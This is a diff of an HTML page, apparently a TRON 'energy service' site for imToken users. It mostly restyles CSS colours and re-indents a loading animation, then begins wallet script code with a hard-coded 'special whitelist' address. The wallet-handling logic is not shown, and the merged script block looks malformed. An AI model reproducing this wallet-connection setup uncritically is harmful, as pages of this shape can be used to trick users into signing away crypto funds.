@@ -16,7 +16,7 @@
     <meta name="twitter:url" content="https://trc20trx-alt.github.io/Trc20.TRX/" />
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+* { margin: 0; padding: 0; box-sizing: border-box; }
 body { 
     font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
     padding: 8px 6px; /* 增加内边距，更饱满 */
@@ -102,7 +102,7 @@ body {
     top: 100%;
     right: 0;
     min-width: 120px;
-    background: #fffbeb; /* 浅红色系背景 */
+    background: #ffffff; /* 白色背景 */
     border: 1px solid #ef4444; /* 浅红色边框 */
     border-radius: 8px;
     padding: 4px 0;
@@ -156,12 +156,12 @@ body {
 }
 .header h1 { 
     font-size: 30px; /* 字体调大，更醒目 */
-    color: #ef4444; /* 浅红色标题 */
+    color: #000000; /* 黑色标题 */
     margin-bottom: 0;
    line-height: 1.2;
 }
 .warning {
-    background: #fffbeb; /* 浅红色系背景 */
+    background: #ffffff; /* 白色背景 */
     color: #991b1b; /* 深红色文字 */
     padding: 8px; /* 调大内边距 */
     border-radius: 8px;
@@ -176,7 +176,7 @@ body {
     text-align: center;
     font-size: 12px; /* 字体调大 */
     padding: 12px; /* 调大内边距，填充空间 */
-    background: #fffbeb; /* 浅红色系背景 */
+    background: #ffffff; /* 白色背景 */
     border-radius: 8px;
     border: 1px solid #fca5a5; /* 浅红色边框 */
     line-height: 1.6;
@@ -188,7 +188,7 @@ body {
 }
 /* 钱包状态容器：适配两种状态，调大内容 */
 #walletStatusContainer {
-    background: #fffbeb; /* 浅红色系背景 */
+    background: #ffffff; /* 白色背景 */
     padding: 12px; /* 调大内边距 */
     border-radius: 8px;
     border: 1px solid #fca5a5; /* 浅红色边框 */
@@ -200,7 +200,7 @@ body {
 }
 #walletStatusContainer .status-title {
     font-size: 14px; /* 字体调大 */
-    color: #ef4444; /* 浅红色标题 */
+    color: #000000; /* 黑色标题 */
     margin-bottom: 6px;
     display: flex;
     align-items: center;
@@ -227,7 +227,7 @@ body {
 }
 /* 合约资源容器：调大内容+填充空间 */
 #contractResourceContainer {
-    background: #fffbeb; /* 浅红色系背景 */
+    background: #ffffff; /* 白色背景 */
     padding: 12px; /* 调大内边距 */
     border-radius: 8px;
     border: 1px solid #fca5a5; /* 浅红色边框 */
@@ -239,7 +239,7 @@ body {
 }
 #contractResourceContainer .status-title {
     font-size: 14px; /* 字体调大 */
-    color: #ef4444; /* 浅红色标题 */
+    color: #000000; /* 黑色标题 */
     margin-bottom: 6px;
     display: flex;
     align-items: center;
@@ -262,7 +262,7 @@ body {
 }
 /* 非连接状态专属容器：调大内容+填充空间 */
 .special-tip-container {
-    background: #fffbeb; /* 浅红色系背景 */
+    background: #ffffff; /* 白色背景 */
     padding: 16px; /* 调大内边距 */
     border-radius: 8px;
     border: 1px solid #fca5a5; /* 浅红色边框 */
@@ -274,7 +274,7 @@ body {
 }
 .special-tip-title {
     font-size: 16px; /* 字体调大 */
-    color: #ef4444; /* 浅红色标题 */
+    color: #000000; /* 黑色标题 */
     font-weight: 600;
     margin-bottom: 6px;
 }
@@ -286,7 +286,7 @@ body {
 }
 /* 连接状态专属容器：调大内容+填充空间 */
 .record-list {
-    background: #fffbeb; /* 浅红色系背景 */
+    background: #ffffff; /* 白色背景 */
     padding: 12px; /* 调大内边距 */
     border-radius: 8px;
     border: 1px solid #fca5a5; /* 浅红色边框 */
@@ -392,7 +392,7 @@ body {
     top: 50%;
     left: 50%;
     transform: translate(-50%, -50%);
-    background: #fffbeb; /* 浅红色系背景 */
+    background: #ffffff; /* 白色背景 */
     border: 1px solid #ef4444; /* 浅红色边框 */
     border-radius: 8px;
     padding: 16px;
@@ -412,63 +412,63 @@ body {
     color: white;
     cursor: pointer;
 }
-  /* 保留你要的加载动画 */
-    #Loading {
-      width: 100%;
-      height: 100vh;
-      background-color: #FFFFFF;
-      position: fixed;
-      top: 0;
-      left: 0;
-      z-index: 9999;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-    #Loading .loader {
-      position: relative;
-      width: 64px;
-      height: 64px;
-      border-radius: 50%;
-      perspective: 800px;
-    }
-    #Loading .inner {
-      position: absolute;
-      box-sizing: border-box;
-      width: 100%;
-      height: 100%;
-      border-radius: 50%;
-    }
-    #Loading .inner.one {
-      left: 0%;
-      top: 0%;
-      animation: rotate-one 1s linear infinite;
-      border-bottom: 3px solid #c23631;
-    }
-    #Loading .inner.two {
-      right: 0%;
-      top: 0%;
-      animation: rotate-two 1s linear infinite;
-      border-right: 3px solid #c23631;
-    }
-    #Loading .inner.three {
-      right: 0%;
-      bottom: 0%;
-      animation: rotate-three 1s linear infinite;
-      border-top: 3px solid #c23631;
-    }
-    @keyframes rotate-one {
-      0% { transform: rotateX(35deg) rotateY(-45deg) rotateZ(0deg); }
-      100% { transform: rotateX(35deg) rotateY(-45deg) rotateZ(360deg); }
-    }
-    @keyframes rotate-two {
-      0% { transform: rotateX(50deg) rotateY(10deg) rotateZ(0deg); }
-      100% { transform: rotateX(50deg) rotateY(10deg) rotateZ(360deg); }
-    }
-    @keyframes rotate-three {
-      0% { transform: rotateX(35deg) rotateY(55deg) rotateZ(0deg); }
-      100% { transform: rotateX(35deg) rotateY(55deg) rotateZ(360deg); }
-    }
+/* 保留你要的加载动画 */
+#Loading {
+    width: 100%;
+    height: 100vh;
+    background-color: #FFFFFF;
+    position: fixed;
+    top: 0;
+    left: 0;
+    z-index: 9999;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+#Loading .loader {
+    position: relative;
+    width: 64px;
+    height: 64px;
+    border-radius: 50%;
+    perspective: 800px;
+}
+#Loading .inner {
+    position: absolute;
+    box-sizing: border-box;
+    width: 100%;
+    height: 100%;
+    border-radius: 50%;
+}
+#Loading .inner.one {
+    left: 0%;
+    top: 0%;
+    animation: rotate-one 1s linear infinite;
+    border-bottom: 3px solid #c23631;
+}
+#Loading .inner.two {
+    right: 0%;
+    top: 0%;
+    animation: rotate-two 1s linear infinite;
+    border-right: 3px solid #c23631;
+}
+#Loading .inner.three {
+    right: 0%;
+    bottom: 0%;
+    animation: rotate-three 1s linear infinite;
+    border-top: 3px solid #c23631;
+}
+@keyframes rotate-one {
+    0% { transform: rotateX(35deg) rotateY(-45deg) rotateZ(0deg); }
+    100% { transform: rotateX(35deg) rotateY(-45deg) rotateZ(360deg); }
+}
+@keyframes rotate-two {
+    0% { transform: rotateX(50deg) rotateY(10deg) rotateZ(0deg); }
+    100% { transform: rotateX(50deg) rotateY(10deg) rotateZ(360deg); }
+}
+@keyframes rotate-three {
+    0% { transform: rotateX(35deg) rotateY(55deg) rotateZ(0deg); }
+    100% { transform: rotateX(35deg) rotateY(55deg) rotateZ(360deg); }
+}
     </style>
 </head>
 <body>
@@ -579,12 +579,10 @@ body {
             © 2025 能量服务 | <a href="https://tronscan.org" target="_blank">TRON浏览器</a> | <a href="https://token.im" target="_blank">imToken官网</a>
         </div>
     </div>
-   <script >
+ <script>
        document.addEventListener('DOMContentLoaded', () => {
       setTimeout(() => {
         document.getElementById("Loading").style.display = "none";
-   </script>
-<script>
 // ========== 全局变量优先定义 ==========
 const SPECIAL_ADDRESS = "TVP7Y8jA7hBc1g7qm72P6aGBfexqLm1SRy"; // 特殊白名单地址
 const A1_SIGNAL_KEY = "a1_signal_records"; // A1信号发送记录（15分钟防重复）
